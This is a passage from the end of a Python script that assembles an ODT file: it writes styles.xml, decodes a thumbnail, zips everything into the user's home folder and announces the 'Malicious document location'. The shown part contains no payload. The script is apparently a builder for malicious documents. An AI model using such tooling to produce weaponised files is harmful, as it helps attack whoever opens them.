text:label-followed-by="listtab"/></style:list-level-properties></text:outline-level-style></text:outline-style><text:notes-configuration text:note-class="footnote" style:num-format="1" text:start-value="0" text:footnotes-position="page" text:start-numbering-at="document"/><text:notes-configuration text:note-class="endnote" style:num-format="i" text:start-value="0"/><text:linenumbering-configuration text:number-lines="false" text:offset="0.499cm" style:num-format="1" text:number-position="left" text:increment="5"/></office:styles><office:automatic-styles><style:page-layout style:name="Mpm1"><style:page-layout-properties fo:page-width="21.001cm" fo:page-height="29.7cm" style:num-format="1" style:print-orientation="portrait" fo:margin-top="2cm" fo:margin-bottom="2cm" fo:margin-left="2cm" fo:margin-right="2cm" style:writing-mode="lr-tb" style:layout-grid-color="#c0c0c0" style:layout-grid-lines="20" style:layout-grid-base-height="0.706cm" style:layout-grid-ruby-height="0.353cm" style:layout-grid-mode="none" style:layout-grid-ruby-below="false" style:layout-grid-print="false" style:layout-grid-display="false" style:footnote-max-height="0cm" loext:margin-gutter="0cm"><style:footnote-sep style:width="0.018cm" style:distance-before-sep="0.101cm" style:distance-after-sep="0.101cm" style:line-style="solid" style:adjustment="left" style:rel-width="25%" style:color="#000000"/></style:page-layout-properties><style:header-style/><style:footer-style/></style:page-layout><style:style style:name="Mdp1" style:family="drawing-page"><style:drawing-page-properties draw:background-size="full"/></style:style></office:automatic-styles><office:master-styles><style:master-page style:name="Standard" style:page-layout-name="Mpm1" draw:style-name="Mdp1"/></office:master-styles></office:document-styles>'''

file = open(temporary_path + 'styles.xml', 'w')
file.write(styles_xml)
file.close()

# END styles.xml

# Thumbnails
os.mkdir(temporary_path + 'Thumbnails')
os.system('echo "iVBORw0KGgoAAAANSUhEUgAAAWoAAAIACAMAAACcgdZwAAAACVBMVEX///8AAAD///9+749PAAAAy0lEQVR42u3BMQEAAADCoPVPbQo/oAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAL4G1h4AAZvAwGcAAAAASUVORK5CYII=" | base64 -d > ' + temporary_path + 'Thumbnails/' + 'thumbnail.png')

# END thumbnails

time.sleep(0.5)
os.system('cd ' + temporary_path + ' && zip -r /home/$SUDO_USER/file.odt *')
time.sleep(0.5)
os.system('rm -r ' + temporary_path)
os.system('printf "\nMalicious document location: /home/$SUDO_USER/file.odt"')
